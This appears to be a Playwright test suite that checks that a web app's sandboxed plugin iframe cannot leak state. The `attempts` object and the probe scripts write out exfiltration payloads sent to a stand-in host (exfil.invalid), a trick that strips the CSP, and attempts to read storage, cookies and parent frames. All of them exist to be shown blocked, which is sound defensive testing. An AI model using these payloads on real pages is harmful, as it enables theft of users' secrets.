import { expect, test, type BrowserContext, type Page } from "@playwright/test";
import {
  PLUGIN_FRAME_PATH,
  PLUGIN_FRAME_RESPONSE_CSP,
} from "../../packages/shared/src/plugin-frame.js";
import { pluginFrameDocument } from "../../apps/web/src/components/session/plugin-bridge.js";
import { PAGE_CSP } from "../../apps/web/src/lib/page-csp.js";

// The frame host is the real file of the built app. The embedding page is a
// harness under the app's page policy, so a plugin document that could only
// run with an inline-script allowance on the app's page fails here.
const HOST_PATH = "/__plugin-frame-harness";
const secret = "synthetic-state-only";

/**
 * `static`: the file as any static host serves it, policy in its `<meta>`.
 * `server`: with the response headers the Covel server adds.
 */
const deliveries = ["static", "server"] as const;

const attempts = {
  location: "location.href = url",
  replace: "location.replace(url)",
  link: "const a = document.createElement('a'); a.href = url; document.body.append(a); a.click()",
  open: "window.open(url, '_self')",
  refresh:
    "const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + url; document.head.append(m)",
  form: "const f = document.createElement('form'); f.action = url; document.body.append(f); f.submit()",
  parent: "parent.location.href = url",
  top: "top.location.href = url",
  relaxedCsp:
    "document.querySelector('meta').remove(); const m = document.createElement('meta'); m.httpEquiv = 'Content-Security-Policy'; m.content = 'default-src *'; document.head.append(m); location.href = url",
};

/** Serve the harness and the frame host; record and answer anything else locally. */
async function serve(
  context: BrowserContext,
  delivery: (typeof deliveries)[number],
): Promise<string[]> {
  const requests: string[] = [];
  await context.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    if (url.pathname === HOST_PATH && !url.search)
      return route.fulfill({
        contentType: "text/html",
        headers: { "Content-Security-Policy": PAGE_CSP },
        body: "<!doctype html><body></body>",
      });
    if (url.pathname === PLUGIN_FRAME_PATH && !url.search) {
      if (delivery === "static") return route.continue();
      const response = await route.fetch();
      return route.fulfill({
        response,
        headers: {
          ...response.headers(),
          "content-security-policy": PLUGIN_FRAME_RESPONSE_CSP,
          "x-frame-options": "SAMEORIGIN",
          "cross-origin-resource-policy": "same-origin",
          "cross-origin-opener-policy": "same-origin",
        },
      });
    }
    requests.push(route.request().url());
    // Fulfill even an escaped navigation locally so a second-load bridge
    // leak is observable. Never contact the destination, including redirects.
    await route.fulfill({
      contentType: "text/html",
      body: `<script>
        addEventListener('message', e => { if (!e.ports[0]) return;
          e.ports[0].onmessage = e => console.log('REMOTE:' + JSON.stringify(e.data));
        });</script>`,
    });
  });
  return requests;
}

/**
 * Frame the host as the app does. Deliberately reconnect on every load of the
 * frame: no untrusted document may become the receiver even with this
 * permissive harness.
 */
async function mount(page: Page, html: string) {
  await page.goto(HOST_PATH);
  await page.evaluate(
    ({ frameUrl, documentHtml, secret }) => {
      const frame = document.createElement("iframe");
      frame.sandbox.add("allow-scripts");
      frame.src = frameUrl;
      (window as unknown as { actions: unknown[] }).actions = [];
      frame.onload = () => {
        const channel = new MessageChannel();
        channel.port1.onmessage = ({ data }) => {
          (window as unknown as { actions: unknown[] }).actions.push(data);
          channel.port1.postMessage({
            type: "result",
            id: data.id,
            value: "ok",
          });
        };
        frame.contentWindow!.postMessage(
          { type: "covel:connect", document: documentHtml },
          "*",
          [channel.port2],
        );
        channel.port1.postMessage({ type: "state", value: { secret } });
      };
      document.body.append(frame);
    },
    {
      frameUrl: PLUGIN_FRAME_PATH,
      documentHtml: pluginFrameDocument(html),
      secret,
    },
  );
}

for (const delivery of deliveries) {
  for (const [name, attack] of Object.entries(attempts)) {
    test(`plugin state cannot leave through ${name} navigation (${delivery} frame host)`, async ({
      page,
      context,
    }) => {
      const requests = await serve(context, delivery);
      const remoteStates: string[] = [];
      page.on("console", (message) => {
        if (message.text().startsWith("REMOTE:"))
          remoteStates.push(message.text());
      });
      const blocked = page.waitForEvent("console", {
        predicate: (message) =>
          /violates|Blocked|Unsafe attempt|not allowed/.test(message.text()),
      });
      await mount(
        page,
        `<body><canvas id="canvas"></canvas><script>
      window.covel.subscribe(async state => {
        if (!state.secret) return;
        document.querySelector('canvas').getContext('2d').fillRect(0, 0, 10, 10);
        await window.covel.invoke('ready', { secret: state.secret });
        const url = 'https://exfil.invalid/redirect?value=' + encodeURIComponent(state.secret);
        ${attack};
      });</script></body>`,
      );
      await blocked;
      await expect
        .poll(() =>
          page.evaluate(
            () => (window as unknown as { actions: unknown[] }).actions,
          ),
        )
        .toEqual([
          { type: "action", id: "1", action: "ready", params: { secret } },
        ]);
      expect(requests).toEqual([]);
      expect(remoteStates).toEqual([]);
    });
  }

  test(`plugin HTML has no access to the app's origin (${delivery} frame host)`, async ({
    page,
    context,
  }) => {
    const requests = await serve(context, delivery);
    await mount(
      page,
      `<body><pre id="report"></pre><script>
      const attempt = async fn => { try { return String(await fn()); } catch (error) { return 'threw:' + error.name; } };
      window.covel.subscribe(async state => {
        if (!state.secret) return;
        const report = {
          origin: self.origin,
          localStorage: await attempt(() => localStorage.getItem('covel:keys')),
          sessionStorage: await attempt(() => sessionStorage.length),
          cookie: await attempt(() => document.cookie),
          indexedDB: await attempt(() => new Promise((resolve, reject) => {
            const request = indexedDB.open('probe');
            request.onsuccess = () => resolve('opened');
            request.onerror = () => reject(request.error);
          })),
          parentStorage: await attempt(() => parent.parent.localStorage.getItem('covel:keys')),
          topDocument: await attempt(() => top.document.title),
          fetchApi: await attempt(() => fetch('/api/health').then(r => r.status)),
          xhr: await attempt(() => new Promise((resolve, reject) => {
            const request = new XMLHttpRequest();
            request.open('GET', '/api/health');
            request.onload = () => resolve(request.status);
            request.onerror = () => reject(new TypeError('xhr'));
            request.send();
          })),
          beacon: await attempt(() => navigator.sendBeacon('/api/health', 'x')),
          image: await attempt(() => new Promise(resolve => {
            const image = new Image();
            image.onload = () => resolve('loaded');
            image.onerror = () => resolve('blocked');
            image.src = '/icon.png?probe';
          })),
        };
        document.getElementById('report').textContent = JSON.stringify(report);
      });</script></body>`,
    );
    await page.evaluate(() => localStorage.setItem("covel:keys", "sk-probe"));
    const report = page
      .frameLocator("iframe")
      .frameLocator("iframe")
      .locator("#report");
    await expect(report).not.toHaveText("");
    const result = JSON.parse((await report.textContent()) ?? "{}") as Record<
      string,
      string
    >;
    expect(result).toMatchObject({
      origin: "null",
      localStorage: "threw:SecurityError",
      sessionStorage: "threw:SecurityError",
      cookie: "threw:SecurityError",
      parentStorage: "threw:SecurityError",
      topDocument: "threw:SecurityError",
      fetchApi: "threw:TypeError",
      xhr: "threw:TypeError",
      image: "blocked",
    });
    expect(result.indexedDB).toMatch(/^threw:/);
    // `sendBeacon` reports that it queued the request; the policy drops it
    // afterwards, so the request list is what shows that nothing left.
    expect(requests).toEqual([]);
  });

  test(`a replacement child document cannot obtain another bridge port (${delivery} frame host)`, async ({
    page,
    context,
    baseURL,
  }) => {
    await serve(context, delivery);
    await mount(
      page,
      `<body><p id="state"></p><script>
    covel.subscribe(state => { document.querySelector('#state').textContent = state.secret ?? ''; });
  </script></body>`,
    );
    await expect(
      page.frameLocator("iframe").frameLocator("iframe").locator("#state"),
    ).toHaveText(secret);
    const wrapper = page.frames()[1]!;
    const child = page.frames()[2]!;
    await child.evaluate(() => {
      location.href = "about:blank";
    });
    await expect.poll(() => child.url()).toBe("about:blank");
    await child.evaluate(() => {
      (window as unknown as { ports: number }).ports = 0;
      addEventListener("message", (event) => {
        (window as unknown as { ports: number }).ports += event.ports.length;
      });
    });
    // Ask the already-connected frame host to relay another port. Its
    // listener must close the offered port instead of reaching the new child.
    await page.evaluate(async () => {
      const channel = new MessageChannel();
      document
        .querySelector("iframe")!
        .contentWindow!.postMessage(
          { type: "covel:connect", document: "<p>second</p>" },
          "*",
          [channel.port2],
        );
      await new Promise((resolve) => setTimeout(resolve, 50));
      channel.port1.close();
    });
    expect(wrapper.url()).toBe(`${baseURL}${PLUGIN_FRAME_PATH}`);
    expect(
      await child.evaluate(
        () => (window as unknown as { ports: number }).ports,
      ),
    ).toBe(0);
  });
}
